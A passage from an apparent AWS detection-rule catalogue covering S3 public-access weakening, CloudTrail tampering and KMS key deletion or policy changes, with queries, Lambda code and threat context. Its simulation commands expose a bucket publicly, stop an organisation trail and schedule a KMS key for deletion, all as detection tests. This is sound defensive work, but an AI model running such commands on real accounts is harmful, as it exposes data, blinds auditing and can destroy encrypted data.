      whyItMatters: "Changes to S3 Block Public Access are only high-value when they weaken effective protections or enable an already-public policy or ACL to take effect. The best version of this detection watches both DeletePublicAccessBlock and weakening PutPublicAccessBlock calls.",
      threatContext: {
        attackerBehavior: "An attacker with s3:PutBucketPublicAccessBlock removes or weakens bucket-level Block Public Access settings so that public ACLs, public bucket policies, or cross-account access embedded in a public policy can become effective.",
        realWorldUsage: "Public exposure of S3 data often comes from configuration drift and automation mistakes, but the same control-plane changes are also useful to attackers because they quietly change who can access data without touching the objects themselves.",
        whyItMatters: "DeletePublicAccessBlock and weakening PutPublicAccessBlock are strong precursor events, but the true risk depends on effective state after the change: account-level settings may still protect the bucket, or an existing public policy may suddenly become enforceable.",
        riskAndImpact: "If effective protections are weakened and the bucket policy or ACLs allow external access, the bucket can become readable by the internet or by unauthorized AWS accounts with little additional attacker effort.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)"],
        requiredFields: ["eventSource", "eventName", "eventTime", "awsRegion", "recipientAccountId", "userIdentity.type", "userIdentity.arn", "sourceIPAddress", "requestParameters.bucketName", "requestParameters.PublicAccessBlockConfiguration.BlockPublicAcls", "requestParameters.PublicAccessBlockConfiguration.IgnorePublicAcls", "requestParameters.PublicAccessBlockConfiguration.BlockPublicPolicy", "requestParameters.PublicAccessBlockConfiguration.RestrictPublicBuckets", "errorCode"],
        loggingRequirements: ["CloudTrail management events for S3 must be enabled.", "The detection should ingest both DeletePublicAccessBlock and PutPublicAccessBlock events.", "To validate actual exposure, the workflow should enrich with GetPublicAccessBlock and GetBucketPolicyStatus."],
        limitations: ["DeletePublicAccessBlock removes only the bucket-level setting; account-level settings may still protect the bucket.", "A PutPublicAccessBlock event only shows the submitted configuration; to determine true weakening, compare it to the previous known state.", "GetBucketPolicyStatus.IsPublic reflects policy-based public exposure, not ACL-only exposure."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "s3.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "DeletePublicAccessBlock or PutPublicAccessBlock" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "CloudTrail event time" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor that changed public access settings" },
          { rawPath: "requestParameters.bucketName", normalizedPath: "aws.s3.bucket.name", notes: "Target bucket" },
          { rawPath: "requestParameters.PublicAccessBlockConfiguration.BlockPublicPolicy", normalizedPath: "aws.s3.bucket.public_access_block.bucket.block_public_policy", notes: "Policy exposure control" },
          { rawPath: "requestParameters.PublicAccessBlockConfiguration.RestrictPublicBuckets", normalizedPath: "aws.s3.bucket.public_access_block.bucket.restrict_public_buckets", notes: "Public bucket restriction control" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "DeletePublicAccessBlock", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { s3: { bucket: { name: "my-bucket" }, public_access_block: { bucket: { state: "removed" } } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Effective Exposure State", description: "Immediately after the control-plane change, evaluate whether the bucket is actually exposed by combining bucket-level PublicAccessBlock, account-level PublicAccessBlock, policy status, and ACL state.", examples: ["GetPublicAccessBlock", "account-level Block Public Access settings", "GetBucketPolicyStatus.IsPublic"], falsePositiveReduction: "This avoids treating every guardrail change as a confirmed public bucket incident." },
        { dimension: "Previous Configuration And Drift Context", description: "Track the previous PublicAccessBlock values so the detector knows whether PutPublicAccessBlock truly weakened protections.", examples: ["previous bucket-level PAB hash", "last known BlockPublicPolicy=true to false transition", "recent prior event history"], falsePositiveReduction: "A true weakening transition is much more important than a no-op or repeated deployment write." },
        { dimension: "Identity And Automation Context", description: "Determine whether the change came from a known website deployment, storage admin, Terraform pipeline, or an unusual human or assumed role session.", examples: ["CloudFormation execution role", "Terraform service role", "admin SSO session"], falsePositiveReduction: "Known storage automation can be down-ranked unless exposure state also changed to public or external." },
        { dimension: "Bucket Intent And Criticality", description: "Classify whether the bucket is intended for public website hosting or content distribution versus internal backups, logs, or sensitive application data.", examples: ["website-hosting bucket tag", "bucket contains CloudTrail or backup data", "data classification"], falsePositiveReduction: "Legitimate public-serving buckets should be handled differently from sensitive internal buckets." },
      ],
      logicExplanation: {
        humanReadable: "This detection should cover two related behaviors: complete removal of bucket-level Block Public Access through DeletePublicAccessBlock, and weakening of one or more bucket-level protections via PutPublicAccessBlock. The highest-fidelity implementation does not stop at the control-plane event; it validates whether protections were actually weakened relative to the previous state and whether the bucket is now effectively public or externally reachable.",
        conditions: ["eventSource equals s3.amazonaws.com", "eventName is DeletePublicAccessBlock or PutPublicAccessBlock", "errorCode does not exist", "for PutPublicAccessBlock: one or more guardrails are set to false, especially BlockPublicPolicy=false or RestrictPublicBuckets=false"],
        tuningGuidance: "1. Track previous bucket-level PublicAccessBlock values so weakening can be detected as a state transition. 2. Validate effective state with GetPublicAccessBlock plus account-level controls before escalating DeletePublicAccessBlock. 3. Use GetBucketPolicyStatus for policy-driven public exposure and ACL checks when ACL guardrails are weakened.",
        whenToFire: "Fire a medium-severity control-plane alert for every successful DeletePublicAccessBlock and for PutPublicAccessBlock requests that set relevant fields to false, but reserve critical alerts for buckets whose effective state becomes public or externally reachable after the change.",
      },
      simulationCommand: "tmp=$(mktemp) && cat > \"$tmp\" <<'EOF'\n{\n  \"Version\": \"2012-10-17\",\n  \"Statement\": [{\"Sid\":\"PublicRead\",\"Effect\":\"Allow\",\"Principal\":\"*\",\"Action\":[\"s3:GetObject\"],\"Resource\":[\"arn:aws:s3:::my-bucket/*\"]}]\n}\nEOF\naws s3api put-public-access-block --bucket my-bucket --public-access-block-configuration BlockPublicAcls=false,IgnorePublicAcls=false,BlockPublicPolicy=false,RestrictPublicBuckets=false && aws s3api put-bucket-policy --bucket my-bucket --policy \"file://$tmp\"",
      quality: {
        signalQuality: 8,
        falsePositiveRate: "Medium-Low after effective-state validation and website-hosting allowlists; Medium if alerting on raw control-plane changes alone",
        expectedVolume: "Low in most environments; usually sporadic administrative or automation-driven changes",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["Athena over CloudTrail logs", "CloudTrail Lake", "Splunk", "Panther", "Chronicle", "Datadog", "EventBridge + Lambda with live S3 API enrichment"],
        scheduling: "Near-real-time is preferred because the rule benefits from immediate post-change state validation. Batch execution every 5-15 minutes also works if the workflow can query current bucket posture during enrichment.",
        considerations: ["Do not rely on DeletePublicAccessBlock alone as proof of exposure.", "Support both DeletePublicAccessBlock and PutPublicAccessBlock in the rule logic.", "Use post-change API enrichment to compute effective state and avoid paging on non-exploitable guardrail churn."],
      },
    },
  },

  // --- CloudTrail ---
  {
    id: "det-002",
    title: "CloudTrail Logging Disabled",
    description: "Detects when CloudTrail logging is stopped or the trail is deleted — a critical defense evasion technique.",
    awsService: "CloudTrail",
    relatedServices: ["IAM"],
    severity: "Critical",
    tags: ["CloudTrail", "Evasion", "Defense"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Planned maintenance or CloudTrail reconfiguration"],
    rules: {
      sigma: `title: CloudTrail Logging Disabled
status: stable
logsource:
  service: cloudtrail
detection:
  selection_base:
    eventSource: cloudtrail.amazonaws.com
  selection_stop:
    eventName: StopLogging
  selection_delete:
    eventName: DeleteTrail
  selection_update:
    eventName: UpdateTrail
  weaken_logging:
    requestParameters.isMultiRegionTrail: false
  weaken_global:
    requestParameters.includeGlobalServiceEvents: false
  weaken_validation:
    requestParameters.enableLogFileValidation: false
  weaken_org:
    requestParameters.isOrganizationTrail: false
  filter_errors:
    errorCode|exists: true
  condition: selection_base and ((selection_stop or selection_delete) or (selection_update and 1 of weaken_*)) and not filter_errors
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventSource=cloudtrail.amazonaws.com
| where (eventName="StopLogging" OR eventName="DeleteTrail") OR (eventName="UpdateTrail" AND (requestParameters.isMultiRegionTrail=false OR requestParameters.includeGlobalServiceEvents=false OR requestParameters.enableLogFileValidation=false OR requestParameters.isOrganizationTrail=false))
| where isnull(errorCode)
| table _time, userIdentity.type, userIdentity.arn, eventName, requestParameters.name, requestParameters.isMultiRegionTrail, requestParameters.includeGlobalServiceEvents, requestParameters.enableLogFileValidation, requestParameters.isOrganizationTrail, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, eventName, requestParameters.name, requestParameters.isMultiRegionTrail, requestParameters.includeGlobalServiceEvents, requestParameters.enableLogFileValidation, requestParameters.isOrganizationTrail, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'cloudtrail.amazonaws.com'
  AND errorCode IS NULL
  AND (
    eventName IN ('StopLogging', 'DeleteTrail')
    OR (
      eventName = 'UpdateTrail'
      AND (
        requestParameters.isMultiRegionTrail = false
        OR requestParameters.includeGlobalServiceEvents = false
        OR requestParameters.enableLogFileValidation = false
        OR requestParameters.isOrganizationTrail = false
      )
    )
  )
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, eventName, requestParameters.name, requestParameters.isMultiRegionTrail, requestParameters.includeGlobalServiceEvents, requestParameters.enableLogFileValidation, requestParameters.isOrganizationTrail, sourceIPAddress
| filter eventSource = "cloudtrail.amazonaws.com"
| filter isblank(errorCode)
| filter eventName = "StopLogging" or eventName = "DeleteTrail" or (eventName = "UpdateTrail" and (requestParameters.isMultiRegionTrail = false or requestParameters.includeGlobalServiceEvents = false or requestParameters.enableLogFileValidation = false or requestParameters.isOrganizationTrail = false))
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.cloudtrail"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["cloudtrail.amazonaws.com"], eventName: ["StopLogging", "DeleteTrail", "UpdateTrail"] } }, null, 2),
      lambda: `"""
CloudTrail Logging Disabled
Trigger: EventBridge rule matching StopLogging, DeleteTrail, or UpdateTrail.
Use for: Real-time alerting when CloudTrail coverage or integrity is reduced.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "cloudtrail.amazonaws.com":
        return {"matched": False}
    if detail.get("errorCode"):
        return {"matched": False}

    name = detail.get("eventName")
    if name in ("StopLogging", "DeleteTrail"):
        return {"matched": True, "alert": {"rule_id": "det-002", "title": "CloudTrail Logging Disabled", "severity": "Critical", "actor": detail.get("userIdentity", {}).get("arn"), "trail_name": detail.get("requestParameters", {}).get("name"), "source_ip": detail.get("sourceIPAddress"), "event_time": detail.get("eventTime")}}

    request = detail.get("requestParameters", {})
    weakened = request.get("isMultiRegionTrail") is False or request.get("includeGlobalServiceEvents") is False or request.get("enableLogFileValidation") is False or request.get("isOrganizationTrail") is False
    if name == "UpdateTrail" and weakened:
        return {"matched": True, "alert": {"rule_id": "det-002", "title": "CloudTrail Logging Disabled", "severity": "Critical", "actor": detail.get("userIdentity", {}).get("arn"), "trail_name": request.get("name"), "source_ip": detail.get("sourceIPAddress"), "event_time": detail.get("eventTime")}}

    return {"matched": False}
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "cloudtrail.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "cloudtrail.amazonaws.com", eventName: "StopLogging", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { name: "my-trail" }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who stopped, deleted, or updated the trail.", "Assess impact on audit visibility.", "Verify if this was planned maintenance.", "Restore CloudTrail immediately if unauthorized."],
    testingSteps: ["Stop logging on a test trail (or use UpdateTrail).", "Verify CloudTrail captures StopLogging/DeleteTrail/UpdateTrail.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "CloudTrail is the primary audit source for AWS management activity. Stopping it, deleting the trail, or weakening trail settings reduces visibility into subsequent IAM, STS, KMS, S3, and service control-plane actions.",
      threatContext: {
        attackerBehavior: "After obtaining credentials with CloudTrail permissions, an attacker can call StopLogging for immediate suppression, DeleteTrail to remove the trail configuration, or UpdateTrail to quietly weaken coverage. The most meaningful UpdateTrail abuse cases are converting a multi-Region trail to single-Region, disabling global service event logging, disabling log file validation, or downgrading an organization trail.",
        realWorldUsage: "This is a common post-compromise defense-evasion pattern in cloud intrusions and red-team tradecraft. Operators often reduce logging just before IAM changes, credential abuse, persistence, or exfiltration so the follow-on activity is harder to detect and investigate.",
        whyItMatters: "StopLogging and DeleteTrail are rare, high-signal administrative actions. UpdateTrail is common enough for normal operations that it must be scoped to security-relevant parameter changes or it becomes noisy.",
        riskAndImpact: "If this goes undetected, responders can lose regional, global-service, or organization-wide visibility, and log integrity guarantees may be broken. That creates blind spots for later malicious actions.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)", "Centralized ingestion for the trail home Region"],
        requiredFields: ["eventSource", "eventName", "eventTime", "awsRegion", "readOnly", "errorCode", "recipientAccountId", "userIdentity.arn", "userIdentity.type", "userIdentity.sessionContext.sessionIssuer.arn", "sourceIPAddress", "userAgent", "requestParameters.name", "requestParameters.isMultiRegionTrail", "requestParameters.includeGlobalServiceEvents", "requestParameters.enableLogFileValidation", "requestParameters.isOrganizationTrail", "requestParameters.s3BucketName", "requestParameters.cloudWatchLogsLogGroupArn"],
        loggingRequirements: ["CloudTrail management events must be enabled for cloudtrail.amazonaws.com.", "Ingest the trail from its home Region; StopLogging, DeleteTrail, and UpdateTrail must be called there for multi-Region trails.", "Prefer an org-level centralized pipeline or secondary immutable logging path so trail tampering does not fully suppress alerting."],
        limitations: ["UpdateTrail only includes parameters supplied in the request; missing fields do not mean a setting was unchanged or false.", "Broad UpdateTrail matching will generate admin-change noise in environments that manage trails with Terraform or control planes.", "If the attacker also disrupts S3/KMS/CloudWatch Logs delivery, downstream SIEM visibility can degrade even though the API call itself is a CloudTrail event."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "CloudTrail API event timestamp" },
          { rawPath: "eventSource", normalizedPath: "event.provider", notes: "Should equal cloudtrail.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "StopLogging, DeleteTrail, or UpdateTrail" },
          { rawPath: "errorCode", normalizedPath: "event.outcome", notes: "Absent = success; populated = failure" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor ARN" },
          { rawPath: "sourceIPAddress", normalizedPath: "source.ip", notes: "Caller IP" },
          { rawPath: "requestParameters.name", normalizedPath: "aws.cloudtrail.trail.name", notes: "Trail name or ARN" },
          { rawPath: "requestParameters.isMultiRegionTrail", normalizedPath: "aws.cloudtrail.trail.is_multi_region", notes: "Coverage reduction when set to false" },
          { rawPath: "requestParameters.enableLogFileValidation", normalizedPath: "aws.cloudtrail.trail.log_file_validation_enabled", notes: "Integrity reduction when false" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "StopLogging", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { cloudtrail: { trail: { name: "org-security-trail" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Identity Context", description: "Classify the actor as break-glass admin, Terraform/CI role, security platform role, human admin, or unexpected workload role.", examples: ["IAM role tags or owner from IAM Identity Center/IdP", "Session issuer ARN for assumed roles", "MFA presence and console vs API caller profile"], falsePositiveReduction: "Known infrastructure automation accounts explain many benign UpdateTrail events but rarely justify StopLogging or DeleteTrail." },
        { dimension: "Trail Criticality", description: "Determine whether the target is the org trail, a multi-Region security trail, or a lower-value account-local trail.", examples: ["DescribeTrails output", "Trail tags such as security or prod", "IsOrganizationTrail metadata"], falsePositiveReduction: "Escalate only when the modified trail is the authoritative security trail for the account or organization." },
        { dimension: "Destination Integrity", description: "Validate whether the trail still writes to approved S3 buckets, KMS keys, SNS topics, and CloudWatch Logs groups.", examples: ["Approved S3 bucket/account allowlist", "Expected CloudWatch Logs group ARN", "Expected KMS key ARN for audit logs"], falsePositiveReduction: "Legitimate reconfiguration usually stays within approved destinations; unexpected destination changes are much higher risk." },
        { dimension: "Behavioral Baseline", description: "Compare this actor and trail against historical change frequency, change windows, and IaC deployment records.", examples: ["First-ever StopLogging by this role", "Terraform apply window correlation", "Change ticket or deployment ID"], falsePositiveReduction: "Out-of-band changes by identities that do not normally manage CloudTrail should be prioritized." },
      ],
      logicExplanation: {
        humanReadable: "This detection should not treat all CloudTrail trail updates equally. Successful StopLogging and DeleteTrail calls are high-confidence defense-evasion events and should alert immediately. Successful UpdateTrail calls should alert only when the submitted parameters weaken audit coverage or integrity, such as changing a multi-Region trail to single-Region, disabling global service events, disabling log file validation, or downgrading an organization trail.",
        conditions: ["eventSource equals cloudtrail.amazonaws.com", "readOnly equals false", "errorCode is absent", "Branch A: eventName equals StopLogging", "Branch B: eventName equals DeleteTrail", "Branch C: eventName equals UpdateTrail AND at least one security-relevant trail setting is explicitly set to false"],
        tuningGuidance: "1. Keep StopLogging and DeleteTrail unsuppressed except for tightly controlled break-glass or account-bootstrap workflows. 2. For UpdateTrail, exclude approved CI/CD or platform roles only when the change matches an expected ticket, IaC deployment, or maintenance window. 3. Treat destination-only changes as a separate suspicious reconfiguration rule and compare against an allowlist of approved audit destinations.",
        whenToFire: "Fire immediately on successful StopLogging and DeleteTrail. Fire on UpdateTrail only when the change materially reduces logging scope or integrity; otherwise log or hunt but do not page.",
      },
      simulationCommand: "aws cloudtrail stop-logging --name org-security-trail --region us-east-1",
      quality: {
        signalQuality: 9,
        falsePositiveRate: "Low for StopLogging/DeleteTrail; Medium for scoped UpdateTrail; High if all UpdateTrail events are included",
        expectedVolume: "0-5 alerts/month in most mature environments; org-dependent",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["EventBridge + Lambda", "CloudWatch Logs Insights", "Athena / CloudTrail Lake scheduled query", "Splunk / SIEM streaming pipeline"],
        scheduling: "Real-time for StopLogging and DeleteTrail via EventBridge or SIEM streaming; 5-15 minute scheduled analytics for scoped UpdateTrail hunting and correlation.",
        considerations: ["Evaluate events in the trail home Region.", "Pair this with a second immutable logging path or org-level aggregation so a single trail change does not blind detection.", "Correlate with follow-on IAM, STS, KMS, S3, GuardDuty, or Security Hub suppression activity in the next 15-60 minutes."],
      },
    },
  },

  // --- KMS ---
  {
    id: "det-019",
    title: "KMS Key Scheduled for Deletion",
    description: "Detects when a KMS key is scheduled for deletion, which could lead to data loss or indicate destructive activity.",
    awsService: "KMS",
    relatedServices: ["S3", "EBS"],
    severity: "Critical",
    tags: ["KMS", "Encryption", "Destructive"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Planned key rotation procedures"],
    rules: {
      sigma: `title: KMS Key Deletion Scheduled
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: kms.amazonaws.com
    eventName: ScheduleKeyDeletion
  condition: selection
level: critical`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=ScheduleKeyDeletion
| table _time, userIdentity.type, userIdentity.arn, requestParameters.keyId, requestParameters.pendingWindowInDays, sourceIPAddress`,
      cloudtrail: `SELECT eventTime, userIdentity.type, userIdentity.arn, requestParameters.keyId, requestParameters.pendingWindowInDays, responseElements.keyState, responseElements.deletionDate, sourceIPAddress
FROM cloudtrail_logs
WHERE eventSource = 'kms.amazonaws.com'
  AND eventName = 'ScheduleKeyDeletion'
ORDER BY eventTime DESC`,
      cloudwatch: `fields @timestamp, userIdentity.type, userIdentity.arn, requestParameters.keyId, requestParameters.pendingWindowInDays, responseElements.keyState, responseElements.deletionDate, sourceIPAddress
| filter eventName = "ScheduleKeyDeletion"
| sort @timestamp desc`,
      eventbridge: JSON.stringify({ source: ["aws.kms"], "detail-type": ["AWS API Call via CloudTrail"], detail: { eventSource: ["kms.amazonaws.com"], eventName: ["ScheduleKeyDeletion"] } }, null, 2),
      lambda: `"""
KMS Key Scheduled for Deletion
Trigger: EventBridge rule matching ScheduleKeyDeletion.
Use for: Real-time alerting on destructive KMS lifecycle actions.
"""

def lambda_handler(event, context):
    detail = event.get("detail", {})
    if detail.get("eventSource") != "kms.amazonaws.com":
        return {"matched": False}
    if detail.get("eventName") != "ScheduleKeyDeletion":
        return {"matched": False}

    return {
        "matched": True,
        "alert": {
            "rule_id": "det-019",
            "title": "KMS Key Scheduled for Deletion",
            "severity": "Critical",
            "actor": detail.get("userIdentity", {}).get("arn"),
            "key_id": detail.get("requestParameters", {}).get("keyId"),
            "pending_window_days": detail.get("requestParameters", {}).get("pendingWindowInDays"),
            "source_ip": detail.get("sourceIPAddress"),
            "event_time": detail.get("eventTime"),
        },
    }
`,
    },
    relatedAttackSlugs: [],
    telemetry: { primaryLogSource: "AWS CloudTrail", generatingService: "kms.amazonaws.com", importantFields: ["eventName", "userIdentity.arn", "requestParameters.keyId", "requestParameters.pendingWindowInDays", "sourceIPAddress", "eventTime"], exampleEvent: JSON.stringify({ eventVersion: "1.08", eventSource: "kms.amazonaws.com", eventName: "ScheduleKeyDeletion", userIdentity: { type: "IAMUser", arn: "arn:aws:iam::123456789012:user/dev-user" }, requestParameters: { keyId: "arn:aws:kms:us-east-1:123456789012:key/xxx", pendingWindowInDays: 7 }, sourceIPAddress: "203.0.113.10", eventTime: "2025-02-10T12:45:00Z" }, null, 2) },
    investigationSteps: ["Identify who scheduled the key deletion.", "Verify if this was planned key rotation.", "Assess impact on encrypted resources (S3, EBS).", "Cancel deletion if unauthorized."],
    testingSteps: ["Schedule key deletion for a test KMS key.", "Verify CloudTrail captures ScheduleKeyDeletion.", "Run the detection to confirm the alert triggers."],
    lifecycle: {
      whyItMatters: "Scheduling deletion of a customer managed KMS key is a destructive control-plane action that can permanently break access to encrypted data, secrets, volumes, snapshots, and application workflows.",
      threatContext: {
        attackerBehavior: "An attacker with kms:ScheduleKeyDeletion can target a customer managed KMS key to create delayed but severe impact. This is useful for sabotage, anti-recovery, or extortion because the key becomes unusable for cryptographic operations while pending deletion, and the final deletion permanently destroys access to ciphertext encrypted under that key.",
        realWorldUsage: "This fits common cloud post-compromise tradecraft where operators tamper with identity, logging, backups, or encryption controls to weaken recovery and increase business impact.",
        whyItMatters: "Most environments rarely schedule deletion for active keys, and legitimate cases are usually tightly change-controlled. The combination of destructive intent, delayed blast radius, and dependency on key criticality makes this one of the highest-value KMS management events to alert on.",
        riskAndImpact: "If this goes undetected, affected workloads can lose decrypt capability, automated backups and restore paths can fail, secrets can become inaccessible, and encrypted business data can become unrecoverable.",
      },
      telemetryValidation: {
        requiredLogSources: ["AWS CloudTrail (management events)", "KMS inventory or CMDB for key criticality and service dependencies"],
        requiredFields: ["eventSource", "eventName", "readOnly", "errorCode", "userIdentity.type", "userIdentity.arn", "requestParameters.keyId", "requestParameters.pendingWindowInDays", "responseElements.keyState", "responseElements.deletionDate", "awsRegion", "recipientAccountId", "sourceIPAddress", "eventTime"],
        loggingRequirements: ["CloudTrail management events must be enabled in every Region that hosts customer managed KMS keys.", "The pipeline must preserve both requestParameters and responseElements so the waiting period, resulting key state, and deletion date are available.", "A key inventory or enrichment source should map keyId to alias, tags, multi-Region status, and downstream resource dependencies."],
        limitations: ["The CloudTrail event proves the deletion was scheduled, but not whether the key is low-value or business-critical; criticality requires enrichment.", "AWS managed keys and AWS owned keys cannot be scheduled for deletion.", "For a multi-Region primary key with existing replicas, the key can enter PendingReplicaDeletion and the actual deletion waiting period does not begin until the last replica key is deleted."],
      },
      dataModeling: {
        rawToNormalized: [
          { rawPath: "eventSource", normalizedPath: "event.source", notes: "Should equal kms.amazonaws.com" },
          { rawPath: "eventName", normalizedPath: "event.action", notes: "ScheduleKeyDeletion API call" },
          { rawPath: "eventTime", normalizedPath: "@timestamp", notes: "Canonical event time" },
          { rawPath: "userIdentity.arn", normalizedPath: "user.arn", notes: "Actor that scheduled deletion" },
          { rawPath: "requestParameters.keyId", normalizedPath: "aws.kms.key.id", notes: "Target KMS key ARN or key ID" },
          { rawPath: "requestParameters.pendingWindowInDays", normalizedPath: "aws.kms.key.deletion.pending_window_days", notes: "7-30 day waiting period" },
          { rawPath: "responseElements.keyState", normalizedPath: "aws.kms.key.state", notes: "PendingDeletion or PendingReplicaDeletion" },
        ],
        exampleNormalizedEvent: JSON.stringify({
          "@timestamp": "2025-02-10T12:45:00Z",
          event: { category: ["configuration"], type: ["change"], action: "ScheduleKeyDeletion", outcome: "success", provider: "aws" },
          user: { arn: "arn:aws:iam::123456789012:user/dev-user", type: "IAMUser" },
          source: { ip: "203.0.113.10" },
          cloud: { provider: "aws", account: { id: "123456789012" }, region: "us-east-1" },
          aws: { kms: { key: { id: "arn:aws:kms:us-east-1:123456789012:key/xxx", deletion: { pending_window_days: 7 }, state: "PendingDeletion" } } },
        }, null, 2),
      },
      enrichment: [
        { dimension: "Key Criticality", description: "Classify the target key by business importance so alerts distinguish lab cleanup from destructive impact on production encryption.", examples: ["KMS alias patterns such as alias/prod-rds", "CMDB or tag values such as environment=prod", "Key manager metadata"], falsePositiveReduction: "Suppresses low-value sandbox retirements while escalating shared, prod, or security-bound keys." },
        { dimension: "Resource Dependency Context", description: "Map the key to the services and resources that depend on it so responders understand potential blast radius.", examples: ["S3 buckets using the key", "EBS default encryption key", "Secrets Manager dependencies"], falsePositiveReduction: "Separates unused or retired keys from keys whose deletion would break active workloads and data access." },
        { dimension: "Deletion Window and Recovery Context", description: "Track the responder time available before irreversible impact and whether recovery is straightforward.", examples: ["pendingWindowInDays set to 7 versus 30", "keyState PendingDeletion versus PendingReplicaDeletion", "presence of a follow-on CancelKeyDeletion event"], falsePositiveReduction: "Legitimate decommissions often use planned windows and documented rollback paths; short windows are more suspicious." },
        { dimension: "Identity and Change Attribution", description: "Profile who made the change and whether the actor normally administers KMS lifecycle operations.", examples: ["Break-glass role", "Terraform execution role", "First-time key deletion by a developer"], falsePositiveReduction: "Approved platform automation can be allowlisted while unexpected human or workload actors remain high priority." },
      ],
      logicExplanation: {
        humanReadable: "This detection should alert on successful ScheduleKeyDeletion calls against customer managed KMS keys because the API itself is rare and inherently destructive. The production-grade version should remain broad at the event layer, but severity should be enriched by key criticality, waiting period length, and whether the key enters PendingDeletion or PendingReplicaDeletion.",
        conditions: ["eventSource equals kms.amazonaws.com", "eventName equals ScheduleKeyDeletion", "readOnly equals false", "errorCode is absent", "requestParameters.keyId is present"],
        tuningGuidance: "1. Keep the base detection broad. 2. Maintain an allowlist only for approved KMS admin or IaC roles, and require a matching maintenance window or change ticket before downgrading. 3. Enrich every event with alias, tags, key manager, and dependent resource inventory so severity reflects actual blast radius.",
        whenToFire: "Fire on every successful ScheduleKeyDeletion event. Page immediately when the key is production-critical, shared across services, or scheduled with a short waiting period.",
      },
      simulationCommand: "aws kms schedule-key-deletion --key-id arn:aws:kms:us-east-1:111122223333:key/1234abcd-12ab-34cd-56ef-1234567890ab --pending-window-in-days 7",
      quality: {
        signalQuality: 9,
        falsePositiveRate: "Low (legitimate key retirement exists but is uncommon and usually change-controlled)",
        expectedVolume: "0-3 alerts/month per account in mature environments; higher during decommission or migration projects",
        productionReadiness: "validated",
      },
      communityConfidence: { accurate: 0, needsTuning: 0, noisy: 0 },
      deployment: {
        whereItRuns: ["EventBridge + Lambda", "CloudWatch Logs Insights", "Athena / CloudTrail Lake scheduled query", "Splunk or SIEM streaming pipeline"],
        scheduling: "Real-time alerting is preferred because the shortest waiting period is 7 days and responders may need to cancel deletion quickly. Add a scheduled inventory check every 1-6 hours to track keys still in PendingDeletion or PendingReplicaDeletion.",
        considerations: ["Treat this as a regional KMS management event and ensure coverage in every active AWS Region.", "Join the event with key inventory so the alert shows alias, tags, multi-Region status, and dependent services.", "Correlate with CancelKeyDeletion, DisableKey, PutKeyPolicy, and service outage signals to prioritize confirmed destructive chains."],
      },
    },
  },
  {
    id: "det-020",
    title: "KMS Key Policy Modified",
    description: "Detects modifications to KMS key policies which could grant unauthorized access to encryption keys.",
    awsService: "KMS",
    relatedServices: ["IAM"],
    severity: "High",
    tags: ["KMS", "Policy", "Encryption"],
    logSources: ["AWS CloudTrail"],
    falsePositives: ["Key policy updates during routine key management"],
    rules: {
      sigma: `title: KMS Key Policy Modified
status: experimental
logsource:
  service: cloudtrail
detection:
  selection:
    eventSource: kms.amazonaws.com
    eventName: PutKeyPolicy
  risky_principal:
    requestParameters.policy|contains:
      - '"Principal":"*"'
      - '"Principal":{"AWS":"*"}'
      - ':root"'
  risky_access:
    requestParameters.policy|contains:
      - '"kms:*"'
      - '"kms:Decrypt"'
      - '"kms:GenerateDataKey'
      - '"kms:CreateGrant"'
      - '"kms:PutKeyPolicy"'
      - '"kms:ScheduleKeyDeletion"'
  lockout_bypass:
    requestParameters.bypassPolicyLockoutSafetyCheck: true
  condition: selection and (1 of risky_* or lockout_bypass)
level: high`,
      splunk: `index=aws sourcetype=aws:cloudtrail eventName=PutKeyPolicy
